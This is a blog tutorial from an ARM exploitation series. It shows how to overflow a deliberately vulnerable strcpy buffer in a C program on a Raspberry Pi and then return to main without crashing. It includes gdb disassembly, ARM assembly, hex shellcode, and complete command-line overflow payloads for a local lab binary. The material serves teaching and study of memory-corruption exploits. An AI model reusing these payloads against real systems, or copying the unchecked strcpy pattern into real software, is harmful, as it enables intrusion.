---
layout: single
title: "ARM Exploitation with Raspberry Pi: Return Back to Program without Crashing"
header:
  image: "https://live.staticflickr.com/65535/49799517733_05b4a81f72_h.jpg"
  teaser: "https://live.staticflickr.com/65535/49799517733_05b4a81f72_h.jpg"
categories:
  - Security
tags:
  - Exploitation
  - Tutorial
  - ARM
  - Buffer Overflow
  - Raspberry Pi
toc: true
toc_label: "Table of Contents"
toc_icon: "heart"
---

In the previous post we have seen how to exploit using simple stack-based buffer overflow. 

[ARM Exploitation with Raspberry Pi: Basic Stack Overflow](https://shantoroy.com/security/ARM-exploitation-raspberry-pi-stack-overflow/)

However, in that post, we exploited the stack using a shellcode and later the program crashed. What if we executed some basic instructions and then return back to the main program as if nothing happened?

In this post, we will learn how to return back to the main program without crashing (avoid segmentation fault) even after we are overflowing the buffer.

Here, we will use the same C program that we used before.

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// This is our vulnerable function
void vulnerable(char *arg) {
    char buff[100];
    // to print return address
    printf("%p\n",&buff[0]);  
    strcpy(buff, arg);
}

// Pass argument in the vulnerable function
int main(int argc, char *argv[]) {
    vulnerable(argv[1]);
    return 0;
}
```

## Debugging
The first thing we need to know is the original return address. We can simply find the return address by disassembling the main program.

```
gef➤  disass main
Dump of assembler code for function main:
   0x000104f4 <+0>:		push	{r11, lr}
   0x000104f8 <+4>:		add	r11, sp, #4
   0x000104fc <+8>:		sub	sp, sp, #8
   0x00010500 <+12>:	str	r0, [r11, #-8]
   0x00010504 <+16>:	str	r1, [r11, #-12]
   0x00010508 <+20>:	ldr	r3, [r11, #-12]
   0x0001050c <+24>:	add	r3, r3, #4
   0x00010510 <+28>:	ldr	r3, [r3]
   0x00010514 <+32>:	mov	r0, r3
   0x00010518 <+36>:	bl	0x104b4 <vulnerable>
   0x0001051c <+40>:	mov	r3, #0
   0x00010520 <+44>:	mov	r0, r3
   0x00010524 <+48>:	sub	sp, r11, #4
   0x00010528 <+52>:	pop	{r11, pc}
End of assembler dump.
```

Here, we see, after the main functions calls **`vulnerable`** at address `0x00010518`, it returns back to the main at **`0x0001051c`**. 

So, after performing the `strcpy` in the `vulnerable` function, if we can return back to the original address, we can avoid the segmentation fault.

**Note**: usually, after overflowing the buffer and overwriting the original return address with the one points at NOP inside the same buffer, the program crashes as it no longer contains the original address.

Now, here, we will discuss two different ways to return back to the original program.
1. Return Using Program Counter
2. Return Using Linking Register

Here, the payload will look like as follows:
```
payload = NOP + shellcode + original return address 
		+ padding + overwritten return address pointing NOP 
```

## Return Using Program Counter
Here, we can simply load the return address in the `Program Counter` and the PC will point back to the main program.


### Assembly Code
Here is the instruction set that loads the address in PC.
```bash
.globl _start
_start:
	ADD R11, SP, #12
	LDR R1, [PC, #4]
	SUB PC, R1, #0x01000000

# as testf.s -o testf.o && ld -N testf.o -o testf
```
Point to be noted, we have the return address as **`0x0001051c`**, which have a NULL byte. So, we cannot simply use the instruction `LDR PC, [PC, #4]`. To remove it, first we load the address without null byte in register `R1` and then we subtract whatever we added to remove the NULL byte.

In ARM, the PC by default points to the instruction position by 8 Bytes from the current instruction. So, if we use `PC, #4`, that means we will have to use 4 Bytes of padding before we put the address in `Little Endian` format.

Using the first instruction, we fixed the frame address as it changes by 12 Bytes when it executes our shellcode. It may vary depending on the system you use.


### Shell Code
Now, we will generate the shellcode of the binary file as follows.
```bash
pi@raspberry$ ./hexstring.sh testf
"\x0c\xb0\x8d\xe2\x04\x10\x9f\xe5\x01\xf4\x41\xe2"
```

Note that, the code of the script named **`hexstring.sh`** is available in the first post of our exploitation tutorial series.

See post: [ARM Exploitation with Raspberry Pi: Lab Setup](https://shantoroy.com/security/ARM-exploitation-Raspberry-Pi-lab-setup/)

### Debugging
Let's first disassemble the vulnerable function
```
gef➤  disassemble vulnerable
Dump of assembler code for function vulnerable:
   0x000104b4 <+0>:		push	{r11, lr}
   0x000104b8 <+4>:		add	r11, sp, #4
   0x000104bc <+8>:		sub	sp, sp, #112	; 0x70
   0x000104c0 <+12>:	str	r0, [r11, #-112]	; 0xffffff90
   0x000104c4 <+16>:	sub	r3, r11, #104	; 0x68
   0x000104c8 <+20>:	mov	r1, r3
   0x000104cc <+24>:	ldr	r0, [pc, #28]	; 0x104f0 <vulnerable+60>
   0x000104d0 <+28>:	bl	0x10354 <printf@plt>
   0x000104d4 <+32>:	sub	r3, r11, #104	; 0x68
   0x000104d8 <+36>:	ldr	r1, [r11, #-112]	; 0xffffff90
   0x000104dc <+40>:	mov	r0, r3
   0x000104e0 <+44>:	bl	0x10360 <strcpy@plt>
   0x000104e4 <+48>:	nop			; (mov r0, r0)
   0x000104e8 <+52>:	sub	sp, r11, #4
   0x000104ec <+56>:	pop	{r11, pc}
   0x000104f0 <+60>:			; <UNDEFINED> instruction: 0x000105b8
End of assembler dump.
```
Now, let's take the breakpoint at the last instruction that returns back to the main function.
```
gef➤  b *0x000104ec
Breakpoint 1 at 0x104ec
```
Now, let's exploit using the following payload:
```
gef➤ run $(python -c 'print "\x01\x10\xa0\xe1"*20+"\x0c\xb0\x8d\xe2\x04\x10\x9f\xe5\x01\xf4\x41\xe2" + "AAAA"+ "\x1c\x05\x01\x01" + "JUNK"+ "\xd8\xf3\xff\x7e"')
```
Now, we can check the register contents and step by step instruction execution using the **`stepi`** command.

### Execution in Terminal
If succeed using the debugger, we can now test in the terminal. 

```bash
pi@raspberry$ ./buf $(python -c 'print "\x01\x10\xa0\xe1"*20+"\x0c\xb0\x8d\xe2\x04\x10\x9f\xe5\x01\xf4\x41\xe2" + "AAAA"+ "\x1c\x05\x01\x01" + "JUNK"+ "\x6c\xf4\xff\x7e"')
```
One thing to remember, the address of the buffer may change outside gdb. So, first check the address printed while running the program.

## Return Using Linking Register
As `LR` contains the return address, we can also load the original address again in the LR and then branch (BX) to it. Here, follow the similar steps we discussed above.
 
### Assembly Instruction
```
.globl _start
_start:
	ADD R11, SP, #12
	LDR LR, [PC, #4]
	SUB LR, LR, #0x01000000
	BX LR

# as testa.s -o testa.o && ld -N testa.o -o testa
```

### Shellcode
```
"\x0c\xb0\x8d\xe2\x04\xe0\x9f\xe5\x01\xe4\x4e\xe2\x1e\xff\x2f\xe1"
```

### Debugging
```
gef> run $(python -c 'print "\x01\x10\xa0\xe1"*20+"\x0c\xb0\x8d\xe2\x04\xe0\x9f\xe5\x01\xe4\x4e\xe2\x1e\xff\x2f\xe1"+ "\x1c\x05\x01\x01" + "JUNK"+ "\xd8\xf3\xff\x7e"')
```

### Execution in Terminal
```
./buf $(python -c 'print "\x01\x10\xa0\xe1"*20+"\x0c\xb0\x8d\xe2\x04\xe0\x9f\xe5\x01\xe4\x4e\xe2\x1e\xff\x2f\xe1"+ "\x1c\x05\x01\x01" + "JUNK"+ "\x7c\xf4\xff\x7e"')
```
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTIxNDM4ODcxOTEsMTAxMzE4MTg3OCwtNz
c4NjQ5Mzc0LC0xNDY5MTI3MjM5LDIwNDQwMDc3OTUsMTg5MzA3
NzM4NCwxMDY0NTgzNDEzLDI5MzE3MjUxLDk2MzQyNzc0NCwxOD
k1Njc4ODU0LDEyMjUwNTQ2MDFdfQ==
-->